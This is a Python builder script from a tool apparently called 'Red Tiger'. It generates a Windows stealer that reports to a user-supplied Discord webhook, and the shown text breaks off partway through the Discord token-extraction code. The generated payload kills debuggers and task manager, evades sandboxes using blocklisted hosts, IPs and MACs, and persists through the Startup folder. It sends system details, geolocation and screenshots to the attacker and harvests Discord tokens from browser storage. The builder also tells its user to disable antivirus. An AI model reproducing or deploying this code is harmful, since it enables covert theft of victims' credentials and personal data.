from Config.Util import *
from Config.Config import *
import random
import os
import subprocess
from tkinter import Tk, filedialog

Title("Discord/System/Browser Grab")

print(f"{color.RED}Disable your antivirus !")

webhook = input(f"\n{color.RED}[?] | URL Webhook -> {color.RESET}")
name_file = input(f"{color.RED}[?] | File Name -> {color.RESET}")
icone = input(f"{color.RED}[?] | Add an Icon (y/n) -> {color.RESET}")

if not name_file.strip():
    random_number = random.randint(1, 1000)
    name_file = f'StealerCreate_{random_number}'

if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
 def choose_folder():
    root = Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    icon_path = filedialog.askopenfilename(parent=root, title=f"Red-Tiger {version_tool} | Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
    return icon_path
 icon_path = choose_folder()

file_text = f'./Settings/Program/StealerCreate/{name_file}.txt'
file_python = f'./Settings/Program/StealerCreate/{name_file}.py'
path_destination = "./1-File-Create"

print(f"{color.RED}[!] | Installing missing modules:{color.RESET}")

try:
   import platform
except:
   ModuleInstall("platform")
try:
   import ctypes
except:
   ModuleInstall("ctypes")

try:
   import screeninfo
except:
   ModuleInstall("screeninfo")

try:
   import psutil
except:
   ModuleInstall("psutil")

try:
   import GPUtil
except:
   ModuleInstall("GPUtil")

try:
   import sqlite3
except:
   ModuleInstall("sqlite3")

try:
   import json
except:
   ModuleInstall("json")

try:
   import socket
except:
   ModuleInstall("socket")

try:
   import requests
except:
   ModuleInstall("requests")

try:
   from Crypto.Cipher import AES
except:
   ModuleInstall("pycryptodome")

try:
   import datetime
except:
   ModuleInstall("datetime")

try:
   import base64
except:
   ModuleInstall("base64")

try:
   import re
except:
   ModuleInstall("re")
try:
   import string
except:
   ModuleInstall("string")
try:
   import win32api
except:
   ModuleInstall("win32api")
   ModuleInstall("win32")
try:
   import discord
except:
   ModuleInstall("discord")
   ModuleInstall("discord.py")
try:
   import sys
except:
   ModuleInstall("sys")
try:
   import shutil
except:
   ModuleInstall("shutil")
try:
   import pathlib
except:
   ModuleInstall("pathlib")
try:
   import zipfile
except:
   ModuleInstall("zipfile")
try:
   import win32crypt
except:
   ModuleInstall("win32crypt")
   ModuleInstall("win32")
try:
   import uuid
except:
   ModuleInstall("uuid")
try:
   from PIL import ImageGrab
except:
   ModuleInstall("pyautogui")
   ModuleInstall("imagegrab")

with open(file_text, 'w', encoding='utf-8') as file:
 file.write(f"webhook_url = \"{webhook}\"")
 file.write(r'''
import os
import platform
import ctypes
from screeninfo import *
import psutil
import GPUtil
import sqlite3
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
import json
from json import *
import socket
import requests
from Crypto.Cipher import AES
import subprocess
from datetime import datetime
import base64
import re
import string
import win32api
from discord import Embed, SyncWebhook
import sys
import shutil
from pathlib import Path
from zipfile import ZipFile
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData
from typing import Literal
import uuid
from PIL import ImageGrab
import time

class AntiDebug:
    def __init__(self) -> None:
        if self.checks():
            sys.exit(int())

    def checks(self) -> bool:
        debugging = False

        self.blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
                                 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
        self.blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O',
                                   'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D',
                                 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209',
                               '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77',
                                '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
                                     "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]

        self.check_process()
        if self.get_network():
            debugging = True
        if self.get_system():
            debugging = True

        return debugging

    def check_process(self) -> None:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def get_network(self) -> Literal[True] | None:
        ip = requests.get('https://ipapi.co/ip/').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

        if ip in self.blackListedIPS:
            return True
        if mac in self.blackListedMacs:
            return True

    def get_system(self) -> Literal[True] | None:
        try:
            hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        except:
            hwid = "None"

        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")

        for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):
            if hwid in i or username in i or hostname in i:
                return True
try:
    AntiDebug()
except:
    ()

from datetime import datetime

# Fonction pour obtenir l'heure, la minute, la seconde, l'année, le jour et le mois actuels
def get_current_datetime():
    now = datetime.now()
    return now.hour, now.minute, now.second, now.year, now.day, now.month

hour, minute, second, year, day, month = get_current_datetime()

color_embed = 0xB20000
username_embed = 'Red Tiger'
avatar_embed = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'
footer_embed = {
        "text": f"Red Tiger | {month}/{day}/{year} - {hour}:{minute}:{second}",
        "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
        }
footer_text = f"Red Tiger | {month}/{day}/{year} - {hour}:{minute}:{second}"
                 

try:
        hostname_pc = socket.gethostname()
except:
        hostname_pc = "None"

try:
        username_pc = os.getlogin()
except:
        username_pc = "None"


try:
    displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except:
    displayname_pc = "None"

try:
        response = requests.get('https://httpbin.org/ip')
        
        ip_address_public = response.json()['origin']

except:
        ip_address_public = "None"


try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))

        ip_address_local = s.getsockname()[0]

        s.close()
except:
        ip_address_local = "None"



try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))  

        ip_address_ipv4 = s.getsockname()[0]
        s.close()
except:
        ip_address_ipv4 = "None"



try:
        s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        s.connect(('2001:4860:4860::8888', 80))

        ip_address_ipv6 = s.getsockname()[0]
except:
        ip_address_ipv6 = "None"



try:
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_public}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
except:
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_ipv6}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
else:
    ()

try:
        country = ipdata["country_name"]
except:
        country = "None"

try:
        city = ipdata["city"]
except:
        city = "None"

try:
        country_code = ipdata["country_code"].lower()
except:
        country_code = "None"

try:
        postal = ipdata["postal"]
except:
        postal = "None"

try:
        state = ipdata["state"]
except:
        state = "None"


payload = {
    'content': f'****╔═════════════════Victim Affected═════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(webhook_url, json=payload)

class Startup:
   try:
    try:
        chemin_script = os.path.abspath(__file__)
        nouveau_nom = "Service.py"

        if sys.platform.startswith('win'):  
            dossier_demarrage = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            dossier_demarrage = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            dossier_demarrage = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        else:
            ()
        chemin_nouveau_fichier = os.path.join(dossier_demarrage, nouveau_nom)

        shutil.copy(chemin_script, chemin_nouveau_fichier)
        os.chmod(chemin_nouveau_fichier, 0o777) 
    except:
        chemin_script = sys.executable
        nouveau_nom = "Service.exe"
        if sys.platform.startswith('win'):  
            dossier_demarrage = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            dossier_demarrage = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            dossier_demarrage = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
            
        chemin_nouveau_fichier = os.path.join(dossier_demarrage, nouveau_nom)
        shutil.copy(chemin_script, chemin_nouveau_fichier)
        os.chmod(chemin_nouveau_fichier, 0o777)
   except:
       ()


class System_Info:
    try:
        system_info = {platform.system()}
    except:
        system_info = "None"

    try:
        system_version_info = platform.version()
    except:
        system_version_info = "None"


    try:
        hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        hwid = "None"

    try:
        ram_info = round(psutil.virtual_memory().total / (1024**3), 2)
    except:
        ram_info = "None"


    try:
        cpu_info = platform.processor()
    except:
        cpu_info = "None"

    try:
        cpu_core_info = psutil.cpu_count(logical=False)
    except:
        cpu_core_info = "None"


    try:
        gpus = GPUtil.getGPUs()
        gpu_info = gpus[0].name if gpus else "None"
    except:
        gpu_info = "None"

    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {
                        'drive': drive_path,
                        'total': total_space,
                        'free': free_space,
                        'used': used_space,
                        'name': drive_name,
                    }
                    drives_info.append(drive)
                except:
                    ()
            bitmask >>= 1

        disk_stats = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for drive in drives_info:
            use_percent = (drive['used'] / drive['total']) * 100
            free_space_gb = "{:.2f}GO".format(drive['free'] / (1024 ** 3))
            total_space_gb = "{:.2f}GO".format(drive['total'] / (1024 ** 3))
            use_percent_str = "{:.2f}%".format(use_percent)
            disk_stats += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(drive['drive'], 
                                                                   free_space_gb,
                                                                   total_space_gb,
                                                                   use_percent_str,
                                                                   drive['name'])
    except:
        disk_stats = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        directory = os.getcwd()
        disk_letter = os.path.splitdrive(directory)[0]
    except:
        disk_letter = "None"


    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            platform_info = 'Pc Portable'
        else:
            platform_info = 'Pc Fixed'
    except:
        platform_info = "None"


    try:
        def get_resolution():
            hdc = ctypes.windll.user32.GetDC(0)
            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)  
            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return width, height

        for i, monitor in enumerate(get_monitors(), 1):
            if monitor.is_primary:
                width, height = get_resolution()
                name = monitor.name
                is_primary = 'Yes'

        main_screen = f"""Name         : "{name}" 
Resolution   : "{width}x{height}"
Main Screen  : "{is_primary}"
"""
    except:
        main_screen = "None"


    try:
        def get_resolution():
            hdc = ctypes.windll.user32.GetDC(0)
            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8) 
            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10) 
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return width, height


        monitors = list(get_monitors())

        if len(monitors) > 1:

            second_monitor = monitors[1]

            width, height = get_resolution()

            second_screen =  f"""Name         : "{name}" 
Resolution   : "{width}x{height}"
Main Screen  : "No"
"""
        else:
            second_screen = 'None'
    except:
        second_screen = "None"


    def embed_system(webhook_url, title, fields, color, footer, username, avatar):

        embed_data = {
            'title': title,
            "fields": fields,
            'color': color,
            "footer": footer,
            "thumbnail": {
                "url": ""
                }
        
        }


        data = {
            'embeds': [embed_data],
            'username': username,  
            'avatar_url': avatar
        }


        json_data = json.dumps(data)


        headers = {
            'Content-Type': 'application/json'
        }


        requests.post(webhook_url, data=json_data, headers=headers)

    title = f':flag_{country_code}: | System Info `{username_pc} "{ip_address_public}"`:'

    fields = [
    {"name": f":bust_in_silhouette: | User Pc:", "value": f"""```Name        : "{hostname_pc}"
Username    : "{username_pc}"
DisplayName : "{displayname_pc}"```""", "inline": False},

    {"name": f":computer: | System:", "value": f"""```Plateform    : "{platform_info}"
Exploitation : "{system_info} {system_version_info}"

HWID : "{hwid}"
CPU  : "{cpu_info}, {cpu_core_info} Core"
GPU  : "{gpu_info}"
RAM  : "{ram_info}Go"```""", "inline": False},

{"name": f":satellite: | Ip:", "value": f"""```Public   : "{ip_address_public}"
Local    : "{ip_address_local}"
Ipv4     : "{ip_address_ipv4}"
Ipv6     : "{ip_address_ipv6}"```""", "inline": False},

{"name": f":minidisc: | Disk:", "value": f"""```{disk_stats}```""", "inline": False},

{"name": f":desktop: | Screen:", "value": f"""```Main Screen:
{main_screen}

Secondary Screen:
{second_screen}```""", "inline": False},

{"name": f":flag_{country_code}: | Location:", "value": f"""```Country  : "{country}"
State    : "{state}"
Postal   : "{postal}"
City     : "{city}"```""", "inline": False},

] 
    embed_system(webhook_url, title, fields, color_embed, footer_embed, username_embed, avatar_embed)


def Screenshot(webhook_url):
    try:
        embed = Embed(title=f":desktop: | Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)

        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save("screenshot.png")

        embed.set_image(url="attachment://screenshot.png")

        embed.set_footer(text=footer_text, icon_url=avatar_embed )
        webhook = SyncWebhook.from_url(webhook_url)
        webhook.send(
                embed=embed,
                file=File('.\\screenshot.png', filename='screenshot.png'),
                username=username_embed,
                avatar_url=avatar_embed
            )
        try:
            if os.path.exists("screenshot.png"):
                    os.remove("screenshot.png")
        except:
             ()
    except:
       ()



class Discord_Info:
    def __init__(self, webhook):
        upload_tokens(webhook).upload()


class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens, self.uids = [], []

        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
